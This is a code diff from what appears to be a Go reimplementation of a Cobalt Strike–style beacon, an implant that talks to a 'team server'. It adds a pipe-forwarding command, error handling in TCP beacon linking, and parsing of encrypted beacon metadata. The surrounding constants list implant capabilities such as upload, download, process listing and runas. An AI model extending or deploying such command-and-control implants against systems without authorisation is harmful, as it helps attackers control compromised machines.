@@ -30,6 +30,7 @@ const (
 	CMD_TYPE_DLL_INJECT		= 9		// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
 	CMD_TYPE_UPLOAD_START 	= 10	// IMPLEMENTED
 	CMD_TYPE_DOWNLOAD     	= 11	// IMPLEMENTED
+	CMD_TYPE_PIPE_FWD		= 22 	// ??? is it, tho? Returned after forwarding linked beacon traffic to team server. Should be (target int, data []byte)
 	CMD_TYPE_GETUID		  	= 27	// IMPLEMENTED
 	CMD_TYPE_LIST_PROCESS 	= 32	// IMPLEMENTED
 	CMD_TYPE_RUNAS			= 38	// TODO
@@ -370,12 +371,14 @@ func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
 	if err != nil {
 		processErrorTest(68, 0, 0, "")
 		// panic(err)
+		return -1, nil
     } else {
 		initialMessage := make([]byte, 4)
 		bytesRead, err := conn.Read(initialMessage)
 		if err != nil {
 			// panic(err)
 			processErrorTest(68, 0, 0, "")
+			return -1, nil
 		} else {
 			fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, initialMessage)
 	
@@ -384,6 +387,7 @@ func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
 			if err != nil {
 				processErrorTest(68, 0, 0, "")
 				// panic(err)
+				return -1, nil
 			} else {
 				trimmedMessage := message[:bytesRead]
 				fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, trimmedMessage)
@@ -400,14 +404,16 @@ func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
 				fmt.Printf("Beacon ID  %d\n", beaconId)
 			
 				// The rest of the payload are 128 bytes, the exact length allowed for RSA decrypt on the team server. Coincidence? I think not!
-				encryptedMetaInfo = trimmedMessage[4:]
+				encryptedMetaInfo = trimmedMessage[4:132]
+				fmt.Printf("Beacon metainfo  %x\n", encryptedMetaInfo)
 			
 				AddTcpBeaconLink(beaconId, conn, 0, encryptedMetaInfo)
+				return beaconId, encryptedMetaInfo
 			}
 		}	
 	}
 
-	return beaconId, encryptedMetaInfo
+	// return beaconId, encryptedMetaInfo
 
 }
 
@@ -579,7 +585,7 @@ func processErrorTest(errId int, errArg1 int, errArg2 int, err string) {
 	errMsgBytes := []byte(err)
 	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
 	fmt.Printf("Error byte array: [%x]\n", result)
-	finalPacket := MakePacket(31, result)
+	finalPacket := MakePacket(BEACON_RSP_BEACON_ERROR, result)
 	PushResult(EncryptPacket(finalPacket))
 	// errorBuf = append(errorBuf, finalPacket...)
 }
